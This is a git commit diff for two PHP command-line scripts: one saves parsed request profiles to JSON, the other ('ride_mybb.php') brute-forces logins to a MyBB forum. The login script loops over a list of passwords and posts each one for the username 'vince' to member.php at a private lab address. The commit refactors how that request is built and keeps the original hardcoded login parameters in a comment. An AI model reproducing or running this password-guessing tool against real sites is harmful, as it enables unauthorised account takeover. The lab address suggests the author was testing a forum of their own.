a74b73ff2275d0914839231ab82e2db61ee0f815
Roger Spielmann <puncher@braveheart.ch>
2014-12-29 12:33:58 +0100

    saving profiles to files

--- cli/profile.php
+++ cli/profile.php
@@ -13,14 +13,21 @@ $muster = Array (
     "Data" => "/(?<=--data\s')[^=]*=[^\&]*/"
 );
 
+$prepJson = Array();
+
 foreach($muster as $key => $curmuster){
+
     $x = preg_match_all($curmuster, $contents, $matches);
 
     foreach ($matches[0] as $match) {
+        $prepJson[$key][] = ($match);
         echo "$key: " . $match . PHP_EOL;
     }
 }
 
+$json = json_encode($prepJson);
 
-
+$handle = fopen("../profiles/test.json", "w");
+$success = fwrite  ($handle, $json);
+fclose($handle);
 echo $x;
--- cli/ride_mybb.php
+++ cli/ride_mybb.php
@@ -5,6 +5,41 @@ require_once 'HTTP/Request2.php';
 
 use \HTTP;
 
+/**
+ * @param $password
+ * @return HTTP_Request2
+ */
+function getRequest($params,$password)
+{
+    $req = new HTTP_Request2('http://172.16.129.128/mybb/member.php', HTTP_Request2::METHOD_POST);
+
+    foreach($params as $key=>$param) {
+        foreach ($param as $value) {
+            switch ($key) {
+                case 'Header':
+                    $req->setHeader($value);
+            }
+        }
+    }
+        /*
+            $req->addCookie('XDEBUG_SESSION', 'XDEBUG_ECLIPSE');
+
+            $req->setHeader('User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36');
+            $req->setHeader('Connection:keep-alive');
+
+
+            $req->addPostParameter('action', 'do_login');
+            $req->addPostParameter('url', 'http://172.16.129.128/mybb/index.php');
+            $req->addPostParameter('quick_login', '1');
+            $req->addPostParameter('quick_username', 'vince');
+            $req->addPostParameter('quick_password', $password);
+            $req->addPostParameter('quick_remember', 'no');
+            $req->addPostParameter('submit', 'Login');
+
+        */
+        return $req;
+    }
+
 $passwords = Array(
     'wald',
     'echo',
@@ -17,27 +52,20 @@ $passwords = Array(
 echo PHP_EOL;
 
 
+$filename = "../profiles/test.json";
+$handle = fopen($filename, "r");
+$params = json_decode(fread($handle,filesize($filename)));
+fclose($handle);
+
+
+
 foreach ($passwords as $password) {
 
 
 
     echo 'Trying password: ' . $password . PHP_EOL;
 
-    $req = new HTTP_Request2('http://172.16.129.128/mybb/member.php', HTTP_Request2::METHOD_POST);
-
-    $req->addCookie('XDEBUG_SESSION','XDEBUG_ECLIPSE');
-
-    $req->setHeader('User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36');
-    $req->setHeader('Connection:keep-alive');
-
-
-    $req->addPostParameter('action','do_login');
-    $req->addPostParameter('url','http://172.16.129.128/mybb/index.php');
-    $req->addPostParameter('quick_login','1');
-    $req->addPostParameter('quick_username','vince');
-    $req->addPostParameter('quick_password',$password);
-    $req->addPostParameter('quick_remember','no');
-    $req->addPostParameter('submit','Login');
+    $req = getRequest($params, $password);
 
 
 
